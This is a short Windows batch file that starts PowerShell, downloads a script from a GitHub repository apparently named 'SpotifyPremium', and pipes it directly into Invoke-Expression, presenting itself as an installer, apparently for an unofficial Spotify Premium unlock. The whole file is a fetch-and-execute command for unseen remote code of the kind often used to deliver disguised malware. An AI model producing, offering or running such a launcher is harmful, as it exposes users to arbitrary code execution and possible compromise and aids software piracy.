@echo off
powershell -Command "& {Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/revinewyd/SpotifyPremium/main/install.ps1' | Invoke-Expression}"
pause
exit
